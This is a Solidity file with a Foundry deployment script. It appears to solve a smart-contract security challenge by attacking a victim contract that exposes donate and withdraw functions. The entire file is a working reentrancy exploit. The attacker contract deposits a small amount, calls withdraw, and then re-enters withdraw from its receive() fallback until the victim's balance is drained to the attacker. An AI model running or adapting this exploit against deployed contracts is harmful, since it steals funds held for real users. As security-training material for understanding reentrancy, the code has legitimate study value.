// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttack is Constants {
    uint256 private immutable i_withdrawalAmount;
    IReentrancy private constant victim = IReentrancy(REENTRANCY_ADDRESS);

    constructor() public payable {
        i_withdrawalAmount = msg.value;
    }
    
    function attack() public {
        address _to = address(this);

        victim.donate{value: i_withdrawalAmount}(_to);
        victim.withdraw(i_withdrawalAmount);
    }

    receive() external payable {
        uint256 victimBalance = address(victim).balance;
        uint256 withdrawalAmount = i_withdrawalAmount;

        if (victimBalance < withdrawalAmount) {
            withdrawalAmount = victimBalance;
        }

        if (withdrawalAmount > 0) {
            victim.withdraw(withdrawalAmount);
        }
    }
}

contract ReentrancyAttacker is Constants, Script {
    uint256 private constant DEPOSIT_AMOUNT = 0.001 ether;

    function run() public {
        vm.startBroadcast(ATTACKER_ADDRESS);
        attack();
        vm.stopBroadcast();
    }
    
    function attack() private {
        ReentrancyAttack _attack = new ReentrancyAttack{value: DEPOSIT_AMOUNT}();
        _attack.attack();
    }
}